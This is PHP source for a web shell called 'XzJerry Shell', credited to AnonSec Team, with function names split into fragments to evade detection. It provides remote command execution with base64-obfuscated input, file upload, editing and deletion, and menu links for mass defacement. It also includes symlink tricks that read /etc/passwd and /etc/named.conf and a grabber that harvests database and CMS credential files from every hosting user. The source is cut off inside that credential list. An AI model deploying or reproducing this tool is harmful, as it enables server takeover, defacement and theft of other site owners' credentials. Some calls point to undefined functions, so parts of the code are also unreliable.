<!DOCTYPE html>
<html>
<head>
	<?php echo "<title>Xz"."Jer"."ry Sh"."el"."l</title>"; ?>
	<meta name="robots" content="noindex">
	<link rel="icon" href="https://pub-071ea67114a54cc3a1d68875afee380f.r2.dev/topeng%20ano.jpg" type="image/x-icon">
</head>

<body bgcolor="#1f1f1f" text="#ffffff">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
	@import url('https://fonts.googleapis.com/css?family=Dosis');
	@import url('https://fonts.googleapis.com/css?family=Bungee');
	@import url('https://fonts.googleapis.com/css?family=Russo+One');



body {
    background-image: url(https://pub-071ea67114a54cc3a1d68875afee380f.r2.dev/xjerry-removebg-preview.png);
    background-attachment: fixed;
        background-size: 35rem;
        background-position: center;
        background-repeat: no-repeat;
    font-family: "Dosis", cursive;
    text-shadow: 0px 0px 1px #757575;
}

body::-webkit-scrollbar {
  width: 12px;
}

body::-webkit-scrollbar-track {
  background: #1f1f1f;
}

body::-webkit-scrollbar-thumb {
  background-color: #1f1f1f;
  border: 3px solid gray;
}

#content tr:hover {
	background-color: #636263;
	text-shadow:0px 0px 10px #fff;
}

#content .first {
	background-color: #25383C;
}

#content .first:hover {
	background-color: #25383C
	text-shadow:0px 0px 1px #757575;
}

table {
	border: 1px #fff dotted;
	table-layout: fixed;
}

td {
	word-wrap: break-word;
}

a {
	color: #ffffff;
	text-decoration: none;
}

a:hover {
	color: #000000;
	text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea {
	border: 1px #000000 solid;
	-moz-border-radius: 5px;
	-webkit-border-radius:5px;
	border-radius:5px;
}

.gas {
	background-color: #1f1f1f;
	color: #ffffff;
	cursor: pointer;
}

select {
	background-color: transparent;
	color: #ffffff;
}

select:after {
	cursor: pointer;
}

.linka {
	background-color: transparent;
	color: #ffffff;
}

.up {
	background-color: transparent;
	color: #fff;
}

option {
	background-color: #1f1f1f;
}

.btf {
	background: transparent;
	border: 1px #fff solid;
	cursor: pointer;
}

::-webkit-file-upload-button {
  background: transparent;
  color: #fff;
  border-color: #fff;
  cursor: pointer;
}
</style>
<center>
<?php
echo '<font face="Bungee" size="5">Xz'.'Je'.'rr'.'y Sh'.'el'.'l</font></center>
<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>';
set_time_limit(0);
error_reporting(0);

$gcw = "ge"."tc"."wd";
$exp = "ex"."plo"."de";
$fpt = "fi"."le_p"."ut_co"."nte"."nts";
$fgt = "f"."ile_g"."et_c"."onten"."ts";
$sts = "s"."trip"."slash"."es";
$scd = "sc"."a"."nd"."ir";
$fxt = "fi"."le_"."exis"."ts";
$idi = "i"."s_d"."ir";
$ulk = "un"."li"."nk";
$ifi = "i"."s_fi"."le";
$sub = "subs"."tr";
$spr = "sp"."ri"."ntf";
$fp = "fil"."epe"."rms";
$chm = "ch"."m"."od";
$ocd = "oc"."td"."ec";
$isw = "i"."s_wr"."itab"."le";
$idr = "i"."s_d"."ir";
$ird = "is"."_rea"."da"."ble";
$isr = "is_"."re"."adab"."le";
$fsz = "fi"."lesi"."ze";
$rd = "r"."ou"."nd";
$igt = "in"."i_g"."et";
$fnct = "fu"."nc"."tion"."_exi"."sts";
$rad = "RE"."M"."OTE_AD"."DR";
$rpt = "re"."al"."pa"."th";
$bsn = "ba"."se"."na"."me";
$srl = "st"."r_r"."ep"."la"."ce";
$sps = "st"."rp"."os";
$mkd = "m"."kd"."ir";

$wb = (isset($_SERVER['H'.'T'.'TP'.'S']) && $_SERVER['H'.'T'.'TP'.'S'] === 'o'.'n' ? "ht"."tp"."s" : "ht"."tp") . "://".$_SERVER['HT'.'TP'.'_H'.'OS'.'T'];

$disfunc = @$igt("dis"."abl"."e_f"."unct"."ion"."s");
if (empty($disfunc)) {
	$disf = "<font color='gold'>NONE</font>";
} else {
	$disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
	echo "<center><br>An"."on"."7 - 2"."02"."2<br><a href='https://sh"."el"."l.an"."ons"."ec-te"."am.org/' target='_blank'>An"."on"."Se"."c Te"."am</a></center>";
	exit();
}

function cekdir() {
	if (isset($_GET['loknya'])) {
		$lokasi = $_GET['loknya'];
	} else {
		$lokasi = "ge"."t"."cw"."d";
		$lokasi = $lokasi();
	}
	$b = "i"."s_w"."ri"."tab"."le";
	if ($b($lokasi)) {
		return "<font color='green'>Writeable</font>";
	} else {
		return "<font color='red'>Writeable</font>";
	}
}

function crt() {
	$a = "is"."_w"."ri"."tab"."le";
	if ($a($_SERVER['DO'.'CU'.'ME'.'NT'.'_RO'.'OT'])) {
		return "<font color='green'>Writeable</font>";
	} else {
		return "<font color='red'>Writeable</font>";
	}
}

function xrd($lokena) {
	$a = "s"."ca"."nd"."ir";
    $items = $a($lokena);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $b = "is"."_di"."r";
        $loknya = $lokena.'/'.$item;
        if ($b($loknya)) {
            xrd($loknya);
        } else {
        	$c = "u"."nl"."in"."k";
            $c($loknya);
        }
    }
    $d = "rm"."di"."r";
    $d($lokena);
}

function cfn($fl) {
	$a = "ba"."sena"."me";
	$b = "pat"."hinf"."o";
	$c = $b($a($fl), loknyaINFO_EXTENSION);
	if ($c == "zip") {
		return '<i class="fa fa-file-zip-o" style="color: #d6d4ce"></i>';
	} elseif (preg_match("/jpeg|jpg|png|ico/im", $c)) {
		return '<i class="fa fa-file-image-o" style="color: #d6d4ce"></i>';
	} elseif ($c == "txt") {
		return '<i class="fa fa-file-text-o" style="color: #d6d4ce"></i>';
	} elseif ($c == "pdf") {
		return '<i class="fa fa-file-pdf-o" style="color: #d6d4ce"></i>';
	} elseif ($c == "html") {
		return '<i class="fa fa-file-code-o" style="color: #d6d4ce"></i>';
	}
	else {
		return '<i class="fa fa-file-o" style="color: #d6d4ce"></i>';
	}
}

function ipsrv() {
	$a = "g"."eth"."ost"."byna"."me";
	$b = "fun"."cti"."on_"."exis"."ts";
	$c = "S"."ERVE"."R_AD"."DR";
	$d = "SE"."RV"."ER_N"."AM"."E";
	if ($b($a)) {
		return $a($_SERVER[$d]);
	} else {
		return $a($_SERVER[$c]);
	}
}

function ggr($fl) {
	$a = "fun"."cti"."on_"."exis"."ts";
	$b = "po"."si"."x_ge"."tgr"."gid";
	$c = "fi"."le"."gro"."up";
	if ($a($b)) {
		if (!$a($c)) {
			return "?";
		}
		$d = $b($c($fl));
		if (empty($d)) {
			$e = $c($fl);
			if (empty($e)) {
				return "?";
			} else {
				return $e;
			}
		} else {
			return $d['name'];
		}
	} elseif ($a($c)) {
		return $c($fl);
	} else {
		return "?";
	}
}

function gor($fl) {
	$a = "fun"."cti"."on_"."exis"."ts";
	$b = "po"."s"."ix_"."get"."pwu"."id";
	$c = "fi"."le"."o"."wn"."er";
	if ($a($b)) {
		if (!$a($c)) {
			return "?";
		}
		$d = $b($c($fl));
		if (empty($d)) {
			$e = $c($fl);
			if (empty($e)) {
				return "?";
			} else {
				return $e;
			}
		} else {
			return $d['name'];
		}
	} elseif ($a($c)) {
		return $c($fl);
	} else {
		return "?";
	}
}
function fdt($fl) {
	$a = "da"."te";
	$b = "fil"."emt"."ime";
    return $a("F d Y H:i:s", $b($fl));
}

function dunlut($fl) {
	$a = "fil"."e_exi"."sts";
	$b = "ba"."sena"."me";
	$c = "fi"."les"."ize";
	$d = "read"."fi"."le";
	if ($a($fl) && isset($fl)) {
		header('Con'.'tent-Descr'.'iption: Fi'.'le Tra'.'nsfer');
		header("Conte'.'nt-Control:public");
		header('Cont'.'ent-Type: a'.'pp'.'licat'.'ion/oc'.'tet-s'.'tream');
		header('Cont'.'ent-Dis'.'posit'.'ion: at'.'tachm'.'ent; fi'.'lena'.'me="'.$b($fl).'"');
		header('Exp'.'ires: 0');
		header("Ex"."pired:0");
		header('Cac'.'he-Cont'.'rol: must'.'-revali'.'date');
		header("Cont"."ent-Tran"."sfer-Enc"."oding:bi"."nary");
		header('Pra'.'gma: pub'.'lic');
		header('Con'.'ten'.'t-Le'.'ngth: ' .$c($fl));
		flush();
		$d($fl);
		exit;
	} else {
		return "Fi"."le Not F"."ound !";
	}
}

function komend($kom, $lk) {
	$x = "pr"."eg_"."mat"."ch";
	$xx = "2".">"."&"."1";
	if (!$x("/".$xx."/i", $kom)) {
		$kom = $kom." ".$xx;
	}
	$a = "fu"."ncti"."on_"."ex"."is"."ts";
	$b = "p"."ro"."c_op"."en";
	$c = "htm"."lspe"."cialc"."hars";
	$d = "s"."trea"."m_g"."et_c"."ont"."ents";
	if ($a($b)) {
		$ps = $b($kom, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
		return "<pre>".$c($d($meki[1]))."</pre>";
	} else {
		return "pr"."oc"."_op"."en f"."unc"."tio"."n i"."s di"."sabl"."ed !";
	}
}

function green($text) {
	echo "<center><font color='green'>".$text."</center></font>";
}

function red($text) {
	echo "<center><font color='red'>".$text."</center></font>";
}

function oren($text) {
	return "<center><font color='orange'>".$text."</center></font>";
}

function tuls($nm, $lk) {
	return "[ <a href='".$lk."'>".$nm."</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
}

echo "Se"."rv"."er"." I"."P : <font color=gold>".ipsrv()."</font> &nbsp;/&nbsp; Yo"."ur I"."P : <font color=gold>".$_SERVER[$rad]."</font><br>";
echo "We"."b S"."erv"."er : <font color='gold'>".$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE']."</font><br>";
$unm = "ph"."p_u"."na"."me";
echo "Sys"."tem : <font color='gold'>".@$unm()."</font><br>";
$gcu = "g"."et_"."curr"."ent"."_us"."er";
$gmu = "g"."et"."my"."ui"."d";
echo "Us"."er : <font color='gold'>".@$gcu()."&nbsp;</font>( <font color='gold'>".@$gmu()."</font>)<br>";
$phv = "ph"."pve"."rsi"."on";
echo "PH"."P V"."er"."sio"."n : <font color='gold'>".@$phv()."</font><br>";
echo "Dis"."abl"."e Fu"."nct"."ion : ".$disf."</font><br>";
echo "MySQL : ";
if (@$fnct("my"."sql_co"."nne"."ct")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; cURL : ";
if (@$fnct("cu"."rl"."_in"."it")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; WG"."ET : ";
if (@$fxt("/"."us"."r/b"."in/w"."get")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Pe"."rl : ";
if (@$fxt("/u"."sr/b"."in"."/pe"."rl")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Pyt"."ho"."n : ";
if (@$fxt("/"."us"."r/b"."in/p"."ytho"."n2")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; S"."u"."do : ";
if (@$fxt("/"."us"."r/b"."in/s"."u"."d"."o")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Pk"."e"."x"."e"."c : ";
if (@$fxt("/"."us"."r/b"."in/p"."k"."e"."x"."e"."c")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo "<br>Di"."rect"."ory : &nbsp;";

foreach($_POST as $key => $value){
	$_POST[$key] = $sts($value);
}
echo "</table><br>";
echo '<table width="100%" border="0" cellpadding="5" cellspacing="5" align="center">';
echo '<th> &nbsp;<a class="button" href="'.$_SERVER['SCRIPT_NAME'].'">Home</a>&nbsp; </th>';
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&buatfile=xjerry">&#9741; Buat File</a>&nbsp; </th>';
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&mass=xjerry">&#9741; Mass deface</a>&nbsp; </th>';
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&jump=xjerry">&#9741; Jumping</a>&nbsp; </th>';
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&config=xjerry">&#9741; Config</a>&nbsp; </th>';
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&symlink=xjerry">&#9741; Symlink</a>&nbsp; </th>';
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&about=xjerry">&#9741; About</a>&nbsp; </th>';
echo "</table><br>";

if (isset($_GET['fileloc'])) {
    echo "<tr><td>Current File : ".$_GET['fileloc'];
    echo '</tr></td></table><br/>';
    echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
    author();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
    if (is_dir($_POST['path'])) {
        xrmdir($_POST['path']);
        if (file_exists($_POST['path'])) {
            red("Failed to delete Directory !");
        } else {
            green("Delete Directory Success !");
        }
    } elseif (is_file($_POST['path'])) {
        @unlink($_POST['path']);
        if (file_exists($_POST['path'])) {
            red("Failed to Delete File !");
        } else {
            green("Delete File <i>".basename($_POST['path'])."</i> Success !");
        }
    }
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
    if (isset($_POST['gantin'])) {
        $ren = @rename($_POST['path'], $_POST['newname']);
        if ($ren == true) {
            green("Change Name Success !");
        } else {
            red("Change Name Failed !");
        }
    }
    if (empty($_POST['name'])) {
        $namaawal = $_POST['newname'];
    } else {
        $namawal = $_POST['name'];
    }
    echo "<center>".$_POST['path']."<br>";
    echo '<form method="post">
    New Name : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="gantinama">
    <input type="submit" value="Change" name="gantin" class="button" style="cursor: pointer; border-color: #fff"/>
    </form>';
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
    if (isset($_POST['gasedit'])) {
        $edit = @file_put_contents($_POST['path'], $_POST['src']);
        if ($edit == true) {
            green("Edit File Success !");
        } else {
            red("Edit File Failed !");
        }
    }
    echo "<center>".$_POST['path']."<br><br>";
    echo '<form method="post">
    <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="edit">
    <input type="submit" value="Edit File" name="gasedit" class="button" />
    </form><br>';
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "dunlut") {
    dunlut($_POST['path']);
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "unzip") {
    unzip($_POST['path'], $lokasi);
} elseif ($_REQUEST['upload'] == "xjerry") {
    echo "<center>Upload File : ";
    echo '<form enctype="multipart/form-data" method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
<br>403 Upload File<br>
<input type="file" id="datanya" onchange="setfilename(this.value); loadFile(this.files[0])"/>
<input type="hidden" name="bepasnama" id="namanya">
<textarea style="display: none" id="bepasdata" name="bepasdata"></textarea>
<input type="submit" name="bepas" value="Upload" class="up" style="cursor: pointer; border-color: #fff">
</form><br><br></center>';
} elseif ($_GET['komend'] == "xjerry") {
    echo "<center>";
    echo '<form method="post" onsubmit="document.getElementById(\'komendnya\').value = btoa(btoa(btoa(document.getElementById(\'komendnya\').value)))">
    '.@get_current_user().'@'.ipserv().':~ $ <input type="text" name="komend" id="komendnya" style="background-color: #1f1f1f; color: #fff">
    <input type="submit" name="eksekomend" value=" >> " class="up" style="cursor: pointer; border-color: #fff">
    </form><br>';
    if (isset($_POST['eksekomend'])) {
        ekse($_POST['komend'], $lokasi);
    }
    echo "</center>";

} elseif ($_REQUEST['symlink'] == "xjerry") {
	if (!is_file('named.txt')) {
        $d00m = @file('/etc/named.conf');
    } else {
        $d00m = @file('named.txt');
    }
    if (!$d00m) {
        die("<hr><br><center><a class='button' href='?path=$lokasi&symread=xjerry'>Bypass Read</a> <a class='button' href='?path=$lokasi&sym_404=xjerry'>Symlink 404</a> <a class='button' href='?path=$lokasi&sym_bypas=xjerry'>Symlink Bypass</a><br><br/><font color='red'>Can't read   /etc/named.conf</font><br/><br/></center><br>");
    } else {
        echo "[ <a href='?path=$dir&symread=xjerry'>Bypass Read</a> ] [ <a href='?path=$lokasi&sym_404=xjerry'>Symlink 404</a> ] [ <a href='?path=$lokasi&sym_bypas=xjerry'>Symlink Bypass</a> ]<div class='tmp'>
                <table align='center' width='100%'>
                    <thead class='bg-info'>
                        <th>Domains</th>
                        <th>Users</th>
                        <th>symlink </th>
                    </thead>";
        foreach ($d00m as $dom) {
            if (eregi('zone', $dom)) {
                preg_match_all('#zone "(.*)"#', $dom, $domsws);
                flush();
                if (strlen(trim($domsws[1][0])) > 2) {
                    $user = posix_getpwuid(@fileowner('/etc/valiases/'.$domsws[1][0]));
                    flush();
                    $site = $user['name'];
                    @symlink('/', 'sym/root');
                    $site = $domsws[1][0];
                    $ir = 'ir';
                    $il = 'il';
                    if (preg_match("/.^$ir/", $domsws[1][0]) or preg_match("/.^$il/", $domsws[1][0])) {
                        $site = ".$domsws[1][0].";
                    }
                    echo "
                                <tr>
                                    <td>
                                        <a target='_blank' href=http://www.".$domsws[1][0].'/>'.$site.' </a>
                                    </td>
                                    <td>
                                        '.$user['name']."
                                    </td>
                                    <td>
                                        <a href='sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a>
                                    </td>
                                </tr>";
                    flush();
                    flush();
                }
            }
        }
        echo '</table>
            </div><br/>';
    }
    exit;
}

if ($_GET['symread'] == 'xjerry') {
    echo '<center>read /etc/named.conf';
    echo "<form method='post' action='?path=$dir&symread=xjerry&save=1'>
            <textarea class='form-control' rows='15' cols='50' name='file'>";
    flush();
    flush();
    $file = '/etc/named.conf';
    $r3ad = @fopen($file, 'r');
    if ($r3ad) {
        $content = @fread($r3ad, @filesize($file));
        echo ''.htmlentities($content).'';
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        $sm = @symlink($file, 'sym.txt');
        if ($sm) {
            $r3ad = @fopen('sym/sym.txt', 'r');
            $content = @fread($r3ad, @filesize($file));
            echo ''.htmlentities($content).'';
        }
    }
    echo "</textarea><br/><input type='submit' class='button' value='Save'/> </form>";
    if (isset($_GET['save'])) {
        $cont = stripcslashes($_POST['file']);
        $f = fopen('named.txt', 'w');
        $w = fwrite($f, $cont);
        if ($w) {
            echo '<br/>save has been successfully</center>';
        }
        fclose($f);
    }
    exit;
}

if ($_GET['sym_404'] == 'xjerry') {
    echo '<center><h2>Symlink 404</h2>
        <form method="post">
            File Target: <input type="text" class="form-control" name="dir" style="width: 250px;height: 20px;" value="/home/public_html/wp-config.php"><br><br>
            Save As: <input type="text" class="form-control" name="isi" style="width: 100px;height: 20px;" placeholder="file.txt"/><br><br/>
            <input type="submit" class="button" value="Execute" name="execute"/>
        </form></center>';
    if ($_POST['execute']) {
        rmdir('xjerry_sym404');
        mkdir('xjerry_sym404', 0777);
        $dir = $_POST['dir'];
        $isi = $_POST['isi'];
        system('ln -s '.$dir.'xjerry_sym404/'.$isi);
        symlink($dir, 'xjerry_sym404/'.$isi);
        $inija = fopen('xjerry_sym404/.htaccess', 'w');
        fwrite($inija, 'ReadmeName '.$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any");
        echo'<a href="/xjerry_sym404/" target="_blank"> >>Sukses<< </a>';
    }
    exit;
}

if ($_GET['sym_bypas'] == 'xjerry') {
    if (isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0) {
        $cont = stripcslashes($_POST['file']);
        if (!file_exists('passwd.txt')) {
            $f = @fopen('passwd.txt', 'w');
            $w = @fwrite($f, $cont);
            fclose($f);
        }
        if ($w or @filesize('passwd.txt') > 0) {
            echo "<div class='tmp mb-4'>
                    <table width='100%'>
                        <thead class='bg-info text-center'>
                            <th>Users</th>
                            <th>symlink</th>
                            <th>FTP</th>
                        </thead>";
            flush();
            $fil3 = file('passwd.txt');
            foreach ($fil3 as $f) {
                $u = explode(':', $f);
                $user = $u['0'];
                echo "<tr class='text-dark'>
                                <td class='text-left pl-1'>$user</td>
                                <td>
                                    <a href='sym/root/home/$user/public_html' target='_blank'>Symlink </a>
                                </td>
                                <td>
                                    <a href='$pageFTP/sym/root/home/$user/public_html' target='_blank'>FTP</a>
                                </td>
                            </tr>";
                flush();
                flush();
            }
            die('</tr></table></div>');
        }
    }

    echo '<center>read /etc/passwd';
    echo "<br/><form method='post' action='?path=$lokasi&sym_bypas=xjerry&save=1'>
            <textarea class='form-control' rows='15' cols='50' name='file'>";
    flush();
    $file = '/etc/passwd';
    $r3ad = @fopen($file, 'r');
    if ($r3ad) {
        $content = @fread($r3ad, @filesize($file));
        echo ''.htmlentities($content).'';
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        $r3ad = @highlight_file($file);
    } elseif (!$r3ad) {
        for ($uid = 0; $uid < 1000; $uid++) {
            $ara = posix_getpwuid($uid);
            if (!empty($ara)) {
                while (list($key, $val) = each($ara)) {
                    echo "$val:";
                }
                echo "\n";
            }
        }
    }
    flush();
    echo "</textarea><br/>
            <input type='submit' class='button' value='Symlink'/><br/>
        </form></center>";
    flush();
    exit;

} elseif ($_REQUEST['config'] == "xjerry") {
	$etc = fopen('/etc/passwd', 'r') or die("<center><pre><font color=red>Can't read /etc/passwd</font></pre></center>");
    $con = mkdir('xjerry_config', 0777);
    $isi_htc = "Options all\nRequire None\nSatisfy Any";
    $htc = fopen('xjerry_config/.htaccess', 'w');
    fwrite($htc, $isi_htc);
    while ($passwd = fgets($etc)) {
        if ($passwd == '' || !$etc) {
            echo "<font color=red>Can't read /etc/passwd</font>";
        } else {
            preg_match_all('/(.*?):x:/', $passwd, $user_config);
            foreach ($user_config[1] as $user_con) {
                $user_config_dir = "/home/$user_con/public_html/";
                if (is_readable($user_config_dir)) {
                    $grab_config =
                    [
                        "/home/$user_con/.my.cnf" => 'cpanel',
                        "/home/$user_con/public_html/config/koneksi.php" => 'Lokomedia',
                        "/home/$user_con/public_html/forum/config.php" => 'phpBB',
                        "/home/$user_con/public_html/sites/default/settings.php" => 'Drupal',
                        "/home/$user_con/public_html/config/settings.inc.php" => 'PrestaShop',
                        "/home/$user_con/public_html/app/etc/local.xml" => 'Magento',
                        "/home/$user_con/public_html/admin/config.php" => 'OpenCart',
                        "/home/$user_con/public_html/application/config/database.php" => 'Ellislab',
                        "/home/$user_con/public_html/vb/includes/config.php" => 'Vbulletin',
                        "/home/$user_con/public_html/includes/config.php" => 'Vbulletin',
                        "/home/$user_con/public_html/forum/includes/config.php" => 'Vbulletin',
                        "/home/$user_con/public_html/forums/includes/config.php" => 'Vbulletin',
                        "/home/$user_con/public_html/cc/includes/config.php" => 'Vbulletin',
                        "/home/$user_con/public_html/inc/config.php" => 'MyBB',
                        "/home/$user_con/public_html/includes/configure.php" => 'OsCommerce',
                        "/home/$user_con/public_html/shop/includes/configure.php" => 'OsCommerce',
                        "/home/$user_con/public_html/os/includes/configure.php" => 'OsCommerce',
                        "/home/$user_con/public_html/oscom/includes/configure.php" => 'OsCommerce',
                        "/home/$user_con/public_html/products/includes/configure.php" => 'OsCommerce',
                        "/home/$user_con/public_html/cart/includes/configure.php" => 'OsCommerce',
                        "/home/$user_con/public_html/inc/conf_global.php" => 'IPB',
                        "/home/$user_con/public_html/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/wp/test/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/blog/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/beta/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/portal/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/site/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/wp/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/WP/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/news/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/wordpress/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/test/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/demo/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/home/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/v1/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/v2/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/press/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/new/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/blogs/wp-config.php" => 'Wordpress',
                        "/home/$user_con/public_html/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/blog/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/submitticket.php" => '^WHMCS',
                        "/home/$user_con/public_html/cms/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/beta/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/portal/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/site/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/main/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/home/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/demo/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/test/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/v1/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/v2/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/joomla/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/new/configuration.php" => 'Joomla',
                        "/home/$user_con/public_html/WHMCS/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/whmcs1/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Whmcs/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/whmcs/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/whmcs/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/WHMC/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Whmc/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/whmc/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/WHM/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Whm/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/whm/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/HOST/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Host/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/host/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/SUPPORTES/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Supportes/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/supportes/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/domains/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/domain/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Hosting/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/HOSTING/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/hosting/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/CART/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Cart/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/cart/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/ORDER/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Order/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/order/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/CLIENT/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Client/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/client/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/CLIENTAREA/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Clientarea/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/clientarea/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/SUPPORT/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Support/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/support/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/BILLING/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Billing/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/billing/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/BUY/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Buy/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/buy/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/MANAGE/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Manage/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/manage/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/CLIENTSUPPORT/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/ClientSupport/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Clientsupport/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/clientsupport/submitticket.php" => 'WHMCS',
